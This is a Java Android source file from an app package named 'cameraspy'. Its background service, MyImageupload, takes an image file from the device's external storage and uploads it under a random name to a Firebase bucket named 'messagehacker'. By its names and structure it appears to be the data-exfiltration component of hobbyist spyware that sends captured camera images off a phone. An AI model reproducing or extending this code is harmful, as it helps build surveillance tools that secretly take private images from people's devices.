package com.example.yogesh.cameraspy;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.NonNull;
import android.widget.Toast;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.Random;

public class MyImageupload extends Service {
    String RandomAudioFileName = "ABCDEFGHIJKLMNOP";
    Random random ;
    public MyImageupload() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public void onCreate() {

        Toast.makeText(this, "y", Toast.LENGTH_SHORT).show();
        super.onCreate();
        random=new Random();

        FirebaseStorage storage = FirebaseStorage.getInstance();
        StorageReference storageReference = storage.getReferenceFromUrl("gs://messagehacker-50a5c.appspot.com").child(""+CreateRandomAudioFileName(5));

        File file = null;
        String j= String.format( Environment.getExternalStorageDirectory().getAbsolutePath() + "/" +
                "AudioRecording.jpeg");
        Toast.makeText(this, ""+j, Toast.LENGTH_SHORT).show();

        file = new File(j);
        UploadTask uploadTask = storageReference.putFile(Uri.fromFile(file));
uploadTask.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
    @Override
    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
        Toast.makeText(MyImageupload.this, "Uploaded", Toast.LENGTH_SHORT).show();
   stopSelf();

    }
});

uploadTask.addOnFailureListener(new OnFailureListener() {
    @Override
    public void onFailure(@NonNull Exception e) {
        Toast.makeText(MyImageupload.this, ""+e, Toast.LENGTH_SHORT).show();
    }
});
    }
    public String CreateRandomAudioFileName(int string){
        StringBuilder stringBuilder = new StringBuilder( string );
        int i = 0 ;
        while(i < string ) {
            stringBuilder.append(RandomAudioFileName.
                    charAt(random.nextInt(RandomAudioFileName.length())));

            i++ ;
        }
        return stringBuilder.toString();
    }
}
